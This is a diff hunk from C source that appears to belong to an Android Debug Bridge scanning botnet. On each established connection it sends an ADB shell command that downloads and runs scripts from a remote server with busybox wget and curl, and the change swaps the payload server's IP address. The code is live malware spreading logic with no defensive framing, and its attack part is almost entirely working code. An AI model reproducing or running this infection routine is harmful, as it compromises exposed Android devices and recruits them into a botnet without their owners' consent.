@@ -208,7 +208,7 @@ static void process_event(struct epoll_event *pp, int core_id)
 
         printf("Established (%d.%d.%d.%d:%d) FD %d\n", target_connection[pp->data.fd].addr & 0xff, (target_connection[pp->data.fd].addr >> 8) & 0xff, (target_connection[pp->data.fd].addr >> 16) & 0xff, (target_connection[pp->data.fd].addr >> 24) & 0xff, ntohs(target_connection[pp->data.fd].port), pp->data.fd);
         send(pp->data.fd, CNXN, CNXN_SIZE, MSG_NOSIGNAL);
-        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp/; busybox wget http://198.12.70.38/w.sh; sh w.sh; curl http://198.12.70.38/c.sh; sh c.sh; wget http://198.12.70.38/wget.sh; sh wget.sh; curl http://198.12.70.38/wget.sh; sh wget.sh; busybox wget http://198.12.70.38/wget.sh; sh wget.sh; busybox curl http://198.12.70.38/wget.sh; sh wget.sh");
+        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp/; busybox wget http://103.183.118.73/w.sh; sh w.sh; curl http://103.183.118.73/c.sh; sh c.sh; wget http://103.183.118.73/wget.sh; sh wget.sh; curl http://103.183.118.73/wget.sh; sh wget.sh; busybox wget http://103.183.118.73/wget.sh; sh wget.sh; busybox curl http://103.183.118.73/wget.sh; sh wget.sh");
         sent++;
         printf("Shell command sent to FD %d\n", pp->data.fd);
         target_connection[pp->data.fd].timeout = time(NULL);
